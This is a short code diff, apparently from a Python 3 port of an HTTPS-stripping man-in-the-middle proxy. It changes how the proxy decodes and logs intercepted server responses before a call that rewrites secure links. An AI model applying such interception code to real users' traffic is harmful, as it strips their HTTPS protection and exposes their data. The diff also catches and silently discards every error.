@@ -146,19 +146,14 @@ class ServerConnection(HTTPClient):
             # CHANGE: BytesIO
             data = gzip.GzipFile('', 'rb', 9, BytesIO(data)).read()
         
-        # CHANGE? Changed logging
-        # logging.log(self.getLogLevel(), "Read from server:")
-        # logging.log(self.getLogLevel(), data)
-        logging.log(self.getLogLevel(), "Read from server:\n" + data)
-
-        # CHANGE: decoding & encoding
-        # decoded_data = data.decode('utf-8')
-        # data = self.replaceSecureLinks(decoded_data).encode('utf-8')
+        # CHANGE: Decoded
+        decoded_data = data.decode('utf-8')
         
-        # CHANGE?: Try and except
+        logging.log(self.getLogLevel(), "Read from server:")
+        logging.log(self.getLogLevel(), decoded_data)
+
+        # CHANGE: Try and except changing and re encoding
         try: 
-            # CHANGE: decoding & encoding
-            decoded_data = data.decode('utf-8')
             data = self.replaceSecureLinks(decoded_data).encode('utf-8')
         except:
             pass
@@ -167,7 +162,7 @@ class ServerConnection(HTTPClient):
             # CHANGE: changed int to string
             self.client.setHeader('Content-Length', str(len(data)))
         
-        # CHANGE?: Try and except
+        # CHANGE: Try and except, it aint pretty but it resolves the issue
         try:
             self.client.write(data)
             self.shutdown()
